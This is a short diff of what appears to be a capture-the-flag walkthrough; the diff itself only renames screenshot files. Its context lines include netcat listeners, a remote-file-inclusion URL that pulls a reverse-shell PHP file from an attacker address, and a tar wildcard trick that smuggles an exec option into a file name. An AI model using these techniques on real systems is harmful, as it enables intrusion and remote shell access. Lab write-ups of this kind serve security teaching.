@@ -111,7 +111,7 @@ nc -lvnp 1337
 http://10.10.13.172:81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.243.233/revshell.php
 ```
 
-<figure><img src="../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Get autocomplete
 
@@ -152,7 +152,7 @@ touch /var/www/html/--checkpoint-action=exec=bash\ shell
 nc -nvlp 1338
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a password in the configuration file, it does not work for root but we see in the home directory another user called jjameson
 
